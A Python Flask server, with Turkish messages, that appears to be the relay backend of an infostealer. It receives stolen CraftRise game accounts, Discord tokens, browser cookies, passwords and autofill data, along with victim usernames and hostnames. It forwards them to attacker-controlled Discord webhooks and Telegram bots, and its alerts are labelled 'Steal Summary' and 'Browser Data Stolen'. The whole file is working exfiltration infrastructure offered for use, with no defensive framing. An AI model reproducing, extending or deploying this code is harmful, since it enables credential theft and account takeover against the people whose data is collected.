from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")  # YENI
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")  # YENI

def send_discord(url, data):
    if not url:
        return
    try:
        if isinstance(data, str):
            requests.post(url, json={"content": data}, timeout=30)
        else:
            requests.post(url, json=data, timeout=30)
    except Exception as e:
        print(f"Discord hatası: {e}")

def send_telegram(token, chat_id, msg):
    if token and chat_id and msg:
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}, timeout=30)
        except:
            pass

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        log_type = data.get("type", "unknown")
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            payload = data.get("data", data)
            send_discord(CRAFTRISE_WEBHOOK, payload)
            
            if CRAFTRISE_TELEGRAM_TOKEN and CRAFTRISE_TELEGRAM_CHAT_ID:
                content = payload.get("content", "")
                match = re.search(r'`([^`]+)`', content)
                if match:
                    tg_msg = f"🎮 **CraftRise Hesabı!**\n```\n{match.group(1)}\n```"
                else:
                    tg_msg = content
                send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            payload = data.get("data", data)
            send_discord(DISCORD_WEBHOOK, payload)
            
            if DISCORD_TELEGRAM_TOKEN and DISCORD_TELEGRAM_CHAT_ID:
                content = payload.get("content", "")
                user_match = re.search(r'\*\*User:\*\* `([^`]+)`', content)
                token_match = re.search(r'\*\*Token:\*\* `([^`]+)`', content)
                if user_match and token_match:
                    tg_msg = f"💎 **Discord Token!**\n👤 **User:** {user_match.group(1)}\n🔑 **Token:** `{token_match.group(1)[:30]}...`"
                else:
                    tg_msg = content[:500]
                send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ BROWSER (Tarayıcı verileri) ============
        elif log_type == "browser":
            payload = data.get("data", data)
            
            # Discord'a gönder (master webhook)
            browser_msg = f"🕸️ **Tarayıcı Verileri Çalındı!**\n\n📊 **İstatistikler:**\n• Toplam çerez: {payload.get('cookies', 0)}\n• Toplam şifre: {payload.get('passwords', 0)}\n• Toplam otomatik doldurma: {payload.get('autofill', 0)}"
            
            # Zip linki varsa ekle
            if payload.get('download_url'):
                browser_msg += f"\n\n📥 **Download:** {payload['download_url']}"
            
            send_discord(MASTER_WEBHOOK, browser_msg)
            
            # Telegram'a da gönder
            if MASTER_TELEGRAM_TOKEN and MASTER_TELEGRAM_CHAT_ID:
                tg_msg = f"🕸️ *Tarayıcı Verileri Çalındı!*\n\n📊 İstatistikler:\n• Çerez: {payload.get('cookies', 0)}\n• Şifre: {payload.get('passwords', 0)}"
                if payload.get('download_url'):
                    tg_msg += f"\n\n📥 Download: {payload['download_url']}"
                send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ GLOBAL / SUMMARY ============
        else:
            payload = data.get("data", data)
            
            # Özet bilgi
            if isinstance(payload, dict) and "token_count" in payload:
                msg = f"📊 **Steal Summary!**\n```\n👤 User: {payload.get('sys_info', {}).get('username', 'Unknown')}\n💻 Host: {payload.get('sys_info', {}).get('hostname', 'Unknown')}\n🔑 Token Sayısı: {payload.get('token_count', 0)}\n🎮 CraftRise: {payload.get('craftrise', 'None')}\n```"
            else:
                msg = f"📦 **New Data!**\n```json\n{json.dumps(payload, indent=2)[:1000]}\n```"
            
            send_discord(WEBHOOK, msg)
            send_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
